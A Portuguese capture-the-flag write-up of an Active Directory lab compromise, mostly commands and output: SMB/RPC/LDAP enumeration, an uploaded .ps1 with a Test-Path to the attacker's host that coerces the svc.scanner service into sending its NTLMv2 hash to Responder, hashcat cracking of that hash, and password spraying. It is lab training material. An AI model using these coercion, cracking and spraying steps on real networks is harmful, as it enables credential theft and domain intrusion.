# 🎯 Relatório de Invasão: Proxy

> [!abstract] Resumo 
> **Objetivo:** Devemos explorar um ambiente de Active Directory conseguindo um acesso inicial , enumerar e escalar privilégios
> **Vetor de Acesso Inicial:** Conta svc.scanner executava script em IT-shared , com isso fizemos coerção de arquivo e recebemos o hashntlmv2 dela para quebrarmos , assim descobrimos a senha.
> **Vetor de Elevação de Privilégios:** svc.scanner possuía AllowedToDelegate para cifs/DC01.ctf.local 

---

## 🛠️ Ferramentas & Scripts Utilizados
- nmap
- smbclient
- rpcclient
- kerbrute
- nxc smb
- bloodhound-python
- smbmap
- hashcat
- ldapsearch
- bloodhound (Interface Web)
---

## 🔍 1. Reconhecimento & Mapeamento

### Scan de Portas (Nmap)

> [!example] Output do Nmap -sS

| PORT | SERVICE          |
| ---- | ---------------- |
| 53   | domain           |
| 88   | kerberos-sec     |
| 135  | msrpc            |
| 139  | netbios-ssn      |
| 389  | ldap             |
| 445  | microsoft-ds     |
| 464  | kpasswd5         |
| 593  | http-rpc-epmap   |
| 636  | ldapssl          |
| 3268 | globalcatLDAP    |
| 3269 | globalcatLDAPssl |
| 3389 | ms-wbt-server    |

> [!example] Output do Nmap com -sC e -sV
> 

| PORT | SERVICE/VERSION                                                                                          | INFOS                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| ---- | -------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 53   | domain        Simple DNS Plus                                                                            |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| 88   | kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-16 22:43:00Z)                             |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| 135  | msrpc         Microsoft Windows RPC                                                                      |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| 139  | netbios-ssn   Microsoft Windows netbios-ssn                                                              |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| 389  | ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name) |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| 445  | microsoft-ds?                                                                                            |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| 464  | kpasswd5?                                                                                                |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| 593  | ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                        |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| 636  | tcpwrapped                                                                                               |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| 3268 | ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name) |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| 3269 | tcpwrapped                                                                                               |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| 3389 | ms-wbt-server Microsoft Terminal Services                                                                | \|_ssl-date: 2026-09-16T22:43:49+00:00; +12s from scanner time.<br>\| rdp-ntlm-info: <br>\|   Target_Name: CTF<br>\|   NetBIOS_Domain_Name: CTF<br>\|   NetBIOS_Computer_Name: DC01<br>\|   DNS_Domain_Name: ctf.local<br>\|   DNS_Computer_Name: DC01.ctf.local<br>\|   DNS_Tree_Name: ctf.local<br>\|   Product_Version: 10.0.17763<br>\|_  System_Time: 2026-09-16T22:43:09+00:00<br>\| ssl-cert: Subject: commonName=DC01.ctf.local<br>\| Not valid before: 2026-05-19T02:27:27<br>\|_Not valid after:  2026-11-18T02:27:27<br>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows |

> [!info] Análise do Reconhecimento
>Aqui vemos que algumas portas que no -sS ele mostrou certo serviço , quando foi para -sV -sC o nmap colocou tcpwrapped indicando que ele não sabe certamente o que está naquela porta , podemos usar nc para pegar o banner manualmente.
```
nc -knv 10.67.143.168 636 
(UNKNOWN) [10.67.143.168] 636 (ldaps) open
```
>Vemos que é o ldaps realmente.
>Diante disso não temos informações muito importantes , além do nome de dominio do AD.
>Então iremos começar a enumerar serviços de forma manual , começaremos pelo smb na porta 445 que costuma deixar logins anônimos.

| Informações Gerais da fase nmap                                                                                                                                                                                                                                   |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Os serviços a cima rodando no host alvo caracterizando um alvo AD com kerberos autenticação provavelmente ja que ele roda na porta 88.LDAP para consultas.Netbios . RPC , na qual podemos usar para tentar enumerar usuários e grupos.PEMB(SMB Domínio ctf.local. |

### Smb enumeração
```
smbclient -L //10.67.143.168 -N            

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        IT-Shared       Disk      IT Department Shared Resources
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.67.143.168 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
```
smbmap -H 10.67.143.168 -d ctf.local -u 'guest' -p ''

[+] IP: 10.67.143.168:445       Name: 10.67.143.168             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT-Shared                                               READ, WRITE     IT Department Shared Resources
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share
```
> [!info] Análise do reconhecimento
> Aqui vemos que temos acesso de leitura e escrita no shared IT-Shared como guest e leitura no IPC$ . Iremos acessar o IT-Shared para ver o que conseguimos lá.
> Dentro de IT-Shared havia 3 arquivos IT-* , com isso dei get em cada um e irei dar cat para ver seus conteúdos.

#### Cat nos arquivos
```
cat IT-Credentials-Backup.txt 
IT Department - Credentials Backup
===================================
Generated: 2019-08-14
Status: ARCHIVED (accounts disabled pending security review)

  helpdesk.bob  :  Welcome123!    [DISABLED - left company 2021]
  it.admin      :  ITAdmin2019!   [DISABLED - role change 2022]

NOTE: These accounts have been disabled. Active service accounts
      are managed separately by the sysadmin team.
```

```
cat IT-Onboarding-Checklist.txt 
IT Department Onboarding Checklist
====================================
Welcome to the team!

1. Get VPN access from sysadmin
2. Request AD account
3. Install tools (see software list on intranet)
4. Review security policies

Automated Services
------------------
  File Scanner (svc.scanner)
    Runs every 2 minutes. Enumerates IT-Shared for new files to process.
    Uses Shell enumeration to inspect file metadata and icons.
    Contact sysadmin if files are not being processed.

  Database Backup (svc.mssql)
    Handles nightly MSSQL backups. Member of Backup Operators.
    Password rotated quarterly -- do not store locally.

Questions? Email helpdesk@ctf.local
```

```
cat IT-Portal.html             
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CTF Corp – IT Portal</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: Segoe UI, Arial, sans-serif; background: #eef1f5; color: #333; }

    header {
      background: #1b3a5c;
      color: #fff;
      padding: 0 32px;
      height: 56px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    header .brand { font-size: 1.05rem; font-weight: 600; letter-spacing: .5px; }
    header .user  { font-size: .85rem; opacity: .75; }

    nav {
      background: #254e7a;
      padding: 0 32px;
      display: flex;
      gap: 4px;
    }
    nav a {
      color: #c8d8ea;
      text-decoration: none;
      padding: 10px 14px;
      font-size: .88rem;
      border-bottom: 3px solid transparent;
    }
    nav a.active { color: #fff; border-bottom-color: #4fc3f7; }

    .page { max-width: 1060px; margin: 28px auto; padding: 0 20px; }

    .grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 16px; margin-bottom: 24px; }
    .stat {
      background: #fff;
      border-radius: 5px;
      padding: 18px 20px;
      box-shadow: 0 1px 3px rgba(0,0,0,.1);
    }
    .stat .label { font-size: .78rem; color: #888; text-transform: uppercase; letter-spacing: .5px; }
    .stat .value { font-size: 1.7rem; font-weight: 700; color: #1b3a5c; margin-top: 4px; }
    .stat .sub   { font-size: .8rem; color: #aaa; margin-top: 2px; }

    .card {
      background: #fff;
      border-radius: 5px;
      padding: 20px 24px;
      box-shadow: 0 1px 3px rgba(0,0,0,.1);
      margin-bottom: 16px;
    }
    .card h3 { font-size: .95rem; color: #1b3a5c; margin-bottom: 14px; border-bottom: 1px solid #eee; padding-bottom: 8px; }

    table { width: 100%; border-collapse: collapse; font-size: .88rem; }
    th { text-align: left; padding: 7px 10px; color: #666; font-weight: 600; border-bottom: 2px solid #eef1f5; }
    td { padding: 8px 10px; border-bottom: 1px solid #f3f4f6; }
    tr:last-child td { border-bottom: none; }

    .dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; }
    .green  { background: #43a047; }
    .yellow { background: #fb8c00; }
    .red    { background: #e53935; }

    footer { text-align: center; font-size: .78rem; color: #aaa; padding: 24px; }
  </style>
</head>
<body>

<header>
  <span class="brand">&#127970; CTF Corp &mdash; IT Portal</span>
  <span class="user">Logged in as: svc.scanner</span>
</header>

<nav>
  <a href="#" class="active">Dashboard</a>
  <a href="#">Assets</a>
  <a href="#">Tickets</a>
  <a href="#">Users</a>
  <a href="#">Reports</a>
</nav>

<div class="page">

  <div class="grid">
    <div class="stat">
      <div class="label">Managed Hosts</div>
      <div class="value">14</div>
      <div class="sub">3 pending updates</div>
    </div>
    <div class="stat">
      <div class="label">Open Tickets</div>
      <div class="value">7</div>
      <div class="sub">2 high priority</div>
    </div>
    <div class="stat">
      <div class="label">Last Scan</div>
      <div class="value">&#10003;</div>
      <div class="sub">Today 08:42</div>
    </div>
  </div>

  <div class="card">
    <h3>Service Status</h3>
    <table>
      <tr><th>Service</th><th>Host</th><th>Status</th><th>Uptime</th></tr>
      <tr>
        <td>Active Directory</td>
        <td>DC01.ctf.local</td>
        <td><span class="dot green"></span>Online</td>
        <td>32 d</td>
      </tr>
      <tr>
        <td>DNS</td>
        <td>DC01.ctf.local</td>
        <td><span class="dot green"></span>Online</td>
        <td>32 d</td>
      </tr>
      <tr>
        <td>File Share (IT-Shared)</td>
        <td>DC01.ctf.local</td>
        <td><span class="dot green"></span>Online</td>
        <td>32 d</td>
      </tr>
      <tr>
        <td>Backup Agent</td>
        <td>SRV01.ctf.local</td>
        <td><span class="dot yellow"></span>Degraded</td>
        <td>11 d</td>
      </tr>
      <tr>
        <td>Monitoring</td>
        <td>SRV02.ctf.local</td>
        <td><span class="dot red"></span>Offline</td>
        <td>&#8212;</td>
      </tr>
    </table>
  </div>

  <div class="card">
    <h3>Recent Tickets</h3>
    <table>
      <tr><th>#</th><th>Subject</th><th>Assigned</th><th>Priority</th></tr>
      <tr><td>1042</td><td>Printer offline – 2nd floor</td><td>j.smith</td><td>Low</td></tr>
      <tr><td>1041</td><td>VPN access request – new hire</td><td>svc.helpdesk</td><td>Normal</td></tr>
      <tr><td>1039</td><td>Password reset – m.jones</td><td>svc.helpdesk</td><td>Normal</td></tr>
      <tr><td>1037</td><td>Backup job failed on SRV01</td><td>Unassigned</td><td><strong>High</strong></td></tr>
    </table>
  </div>

</div>

<footer>CTF Corp &copy; 2026 &mdash; IT Operations &mdash; Internal use only</footer>

</body>
</html>
```
>[!info] Reconhecimento
>IT-Onboarding-Checklist.txt -> Vemos que por esse arquivos conseguimos descobrir duas contas e senhas que dizem estar desabilitadas mas pode ser que não estejam , iremos testar.
>
>IT-Credentials-Backup.txt  -> Outras duas coisas importantes que conseguimos ver a partir de um desses arquivos são duas contas de serviço (svc.scanner e svc.mssql) que sabemos agora da existência delas , mais importante ainda é a existência da explicação delas , onde para a svc scanner dizer que a cada 2 minutos é feito uma verificação sobre novos arquivos para serem processados que usa shell enumeration para inspecionar metadados e ícones , pode ser possível que consigamos fazer coerção por arquivo , fazendo svc.scanner consultar um responder nosso ao enviarmos um arquivos .url para o smb IT-Shared.
>Tentei usar .url mas não deu certo , eu sabia que esse era o vetor de ataque e pesquisei sobre ataques em cima desse tipo e existe um script que gera payloads para esse tipo de roubo de ntlm no writeup dessa sala , com isso vi que os payloads usuais que funcionam em coerção de arquivos que são os .url , docs e outros acabaram não funcionando.Com isso pesquisei um pouco e apareceu uma possibilidade de usar um arquivo .ps1 do powershell que faz um Test-Path no caminho que a gente escolher , com isso podemos abrir um responder ouvindo no tun0 e mandar o .ps1 para o smb IT-Shared esperando que o script na verdade execute arquivos .ps1.
>
>IT-Portal.html -> Pelas informações do arquivo IT-Portal a gente vê a existência da conta svc.scanner logada no portal ,managed hosts 14 , 7 tickets , para status de serviços vemos DC01.ctf.local sendo o DC do AD está online , DNS DC01 online , FIle Share do IT-Shared Online, Backup Agent SRV01 degraded e Monitoring SRV02 offline. Vemos também tickets abertos indicando impressora offline , acesso de vpn requisitado , password reset para m.jones que podemos testar se foi resetado e se o Welcome123! pode ser o password de reset das contas padrões e um backup falhou em SRV01.

https://github.com/Greenwolf/ntlm_theft
Código do ntlm theft.

```
smbclient //10.67.143.168/IT-Shared
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> put teste.ps1 
putting file teste.ps1 as \teste.ps1 (0.1 kB/s) (average 0.1 kB/s)
smb: \> ls
  .                                   D        0  Wed Sep 16 20:37:18 2026
  ..                                  D        0  Wed Sep 16 20:37:18 2026
  @Shortcut.url                       A      113  Wed Sep 16 20:20:34 2026
  IT-Credentials-Backup.txt           A      406  Thu May 21 23:18:15 2026
  IT-Onboarding-Checklist.txt         A      676  Thu May 21 23:18:16 2026
  IT-Portal.html                      A     4887  Thu May 21 23:19:03 2026
  teste.ps1                           A       43  Wed Sep 16 20:39:09 2026

                7863807 blocks of size 4096. 3573718 blocks available
smb: \> !cat teste.ps1 
Test-Path \\meuip\icons\icon.ico
```
```
[+] Listening for events...                                                                                           

[SMB] NTLMv2-SSP Client   : 10.67.143.168
[SMB] NTLMv2-SSP Username : CTF\svc.scanner
[SMB] NTLMv2-SSP Hash     : svc.scanner::CTF:4c1dbb27d01bd1e9:66AC00760E6CF0157F4E63FAD5D2F8B6:010100000000000080CD50BA1846DD01EAEEACCAD176FBC700000000020008004A0036004E00420001001E00570049004E002D004B004900490057005700300038004C004A004600350004003400570049004E002D004B004900490057005700300038004C004A00460035002E004A0036004E0042002E004C004F00430041004C00030014004A0036004E0042002E004C004F00430041004C00050014004A0036004E0042002E004C004F00430041004C000700080080CD50BA1846DD0106000400020000000800300030000000000000000100000000200000A0B04510B5F75363B45997F42302652817388E764BC9B55E3FD5C2B2013C66610A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003100320039002E003100380036000000000000000000
```
Com isso conseguimos o hash NTLMv2 , assim agora devemos crackear ele.

#### Cracking com hashcat
```
hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) 7 240H, 1468/2937 MB (1468 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (1647 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

SVC.SCANNER::CTF:4c1dbb27d01bd1e9:66ac00760e6cf0157f4e63fad5d2f8b6:010100000000000080cd50ba1846dd01eaeeaccad176fbc700000000020008004a0036004e00420001001e00570049004e002d004b004900490057005700300038004c004a004600350004003400570049004e002d004b004900490057005700300038004c004a00460035002e004a0036004e0042002e004c004f00430041004c00030014004a0036004e0042002e004c004f00430041004c00050014004a0036004e0042002e004c004f00430041004c000700080080cd50ba1846dd0106000400020000000800300030000000000000000100000000200000a0b04510b5f75363b45997f42302652817388e764bc9b55e3fd5c2b2013c66610a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100320039002e003100380036000000000000000000:1summerlove!
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SVC.SCANNER::CTF:4c1dbb27d01bd1e9:66ac00760e6cf0157...000000
Time.Started.....: Wed Sep 16 20:41:14 2026 (5 secs)
Time.Estimated...: Wed Sep 16 20:41:19 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  2503.2 kH/s (1.24ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 12984320/14344385 (90.52%)
Rejected.........: 0/12984320 (0.00%)
Restore.Point....: 12980224/14344385 (90.49%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 1trentonbreinsonbaby -> 1soullost
Hardware.Mon.#01.: Util: 79%

Started: Wed Sep 16 20:41:13 2026
Stopped: Wed Sep 16 20:41:21 2026
```
Com isso executamos coerção de autenticação via arquivo com sucesso e recuperamos uma conta , tendo assim um apoio inicial.

#### smb enumeração como svc.scanner
```
smbmap -H 10.67.191.139 -d ctf.local -u 'svc.scanner' -p '1summerlove!'
```
```
[+] IP: 10.67.191.139:445       Name: 10.67.191.139             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT-Shared                                               READ, WRITE     IT Department Shared Resources
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share
```
>[!info] Reconhecimento
>Vemos aqui que o NETLOGON e SYSVOL que não tinhamos acesso como anônimo agora temos acesso como svc.scanner. SYSVOL é um protocolo usado para GPO's e NETLOGON é um canal de comunicação para domínios AD.
>Mas nesses dois shares não havia nada de interessante .

#### nxc smb para verificar usuários
```
nxc smb 10.67.143.168 -u 'helpdesk.bob' -p 'Welcome123!'
SMB         10.67.143.168   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.67.143.168   445    DC01             [+] ctf.local\helpdesk.bob:Welcome123! (Guest)
                                                                                                                      
┌──(kali㉿kali)-[/media/sf_Pasta_compartilhada_com_vmkali/ProxyRoom]
└─$ nxc smb 10.67.143.168 -u 'it.admin' -p 'ITAdmin2019!'
SMB         10.67.143.168   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.67.143.168   445    DC01             [+] ctf.local\it.admin:ITAdmin2019! (Guest)
```
Aqui vemos GUEST que indica que o nxc smb rebaixou a gente para guest ao conectar no smb pois as credenciais eram inválidas , logo realmente essas contas foram desativadas .

### RPC enumeração
Não posso enumerar com o rpc com usuário anonimo.(Antes de ter a senha da conta svc scanner)
(como svc.scanner)
```
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[svc.scanner] rid:[0x457]
user:[svc.mssql] rid:[0x458]
user:[helpdesk.bob] rid:[0x459]
user:[it.admin] rid:[0x45a]
```
```
rpcclient $> enumdomains
name:[CTF] idx:[0x0]
name:[Builtin] idx:[0x0]
```
```
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x456]
```
>[!] Reconhecimento
>Conseguimos no rpc enumeração os usuários do domínio e os grupos , com isso podemos fazer pulverização de senhas.

### LDAP enumeração
```
ldapsearch -x -H ldap://10.67.143.168 -s base
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=ctf,DC=local
ldapServiceName: ctf.local:dc01$@CTF.LOCAL
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedControl: 1.2.840.113556.1.4.2090
supportedControl: 1.2.840.113556.1.4.2205
supportedControl: 1.2.840.113556.1.4.2204
supportedControl: 1.2.840.113556.1.4.2206
supportedControl: 1.2.840.113556.1.4.2211
supportedControl: 1.2.840.113556.1.4.2239
supportedControl: 1.2.840.113556.1.4.2255
supportedControl: 1.2.840.113556.1.4.2256
supportedControl: 1.2.840.113556.1.4.2309
supportedControl: 1.2.840.113556.1.4.2330
supportedControl: 1.2.840.113556.1.4.2354
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=ctf,DC=local
serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configur
 ation,DC=ctf,DC=local
schemaNamingContext: CN=Schema,CN=Configuration,DC=ctf,DC=local
namingContexts: DC=ctf,DC=local
namingContexts: CN=Configuration,DC=ctf,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=ctf,DC=local
namingContexts: DC=DomainDnsZones,DC=ctf,DC=local
namingContexts: DC=ForestDnsZones,DC=ctf,DC=local
isSynchronized: TRUE
highestCommittedUSN: 36922
dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,
 CN=Sites,CN=Configuration,DC=ctf,DC=local
dnsHostName: DC01.ctf.local
defaultNamingContext: DC=ctf,DC=local
currentTime: 20260916235613.0Z
configurationNamingContext: CN=Configuration,DC=ctf,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```
### Pulverização de senhas
```
nxc smb 10.67.154.189 -u 'svc.scanner' -p '1summerlove!' --pass-pol
SMB         10.67.154.189   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.67.154.189   445    DC01             [+] ctf.local\svc.scanner:1summerlove! 
SMB         10.67.154.189   445    DC01             [+] Dumping password info for domain: CTF
SMB         10.67.154.189   445    DC01             Minimum password length: 7
SMB         10.67.154.189   445    DC01             Password history length: 24
SMB         10.67.154.189   445    DC01             Maximum password age: 41 days 23 hours 53 minutes 
SMB         10.67.154.189   445    DC01             
SMB         10.67.154.189   445    DC01             Password Complexity Flags: 000001
SMB         10.67.154.189   445    DC01                 Domain Refuse Password Change: 0
SMB         10.67.154.189   445    DC01                 Domain Password Store Cleartext: 0
SMB         10.67.154.189   445    DC01                 Domain Password Lockout Admins: 0
SMB         10.67.154.189   445    DC01                 Domain Password No Clear Change: 0
SMB         10.67.154.189   445    DC01                 Domain Password No Anon Change: 0
SMB         10.67.154.189   445    DC01                 Domain Password Complex: 1
SMB         10.67.154.189   445    DC01             
SMB         10.67.154.189   445    DC01             Minimum password age: 1 day 4 minutes 
SMB         10.67.154.189   445    DC01             Reset Account Lockout Counter: 30 minutes 
SMB         10.67.154.189   445    DC01             Locked Account Duration: 30 minutes 
SMB         10.67.154.189   445    DC01             Account Lockout Threshold: None
SMB         10.67.154.189   445    DC01             Forced Log off Time: Not Set
```
Vemos que a política de senha não foi configurada corretamente e por mais que apareça que a conta é bloqueada por 30 minutos , o Account Lockout Threshold é none então podemos fazer quantas tentativas quisermos.
```
nxc smb 10.67.154.189 -u users.txt -p senhas.txt --continue-on-success
SMB         10.67.154.189   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.67.154.189   445    DC01             [-] ctf.local\Administrator:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Guest:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\krbtgt:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.scanner:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.mssql:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [+] ctf.local\helpdesk.bob:Welcome123! (Guest)
SMB         10.67.154.189   445    DC01             [-] ctf.local\it.admin:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Administrator:1summerlover! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Guest:1summerlover! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\krbtgt:1summerlover! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.scanner:1summerlover! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.mssql:1summerlover! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\it.admin:1summerlover! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Administrator:ITAdmin2019! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\Guest:ITAdmin2019! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\krbtgt:ITAdmin2019! STATUS_LOGON_FAILURE 
SMB         10.67.154.189   445    DC01             [-] ctf.local\svc.scanner:ITAdmin2019! STATUS_LOGON_FAILURE 
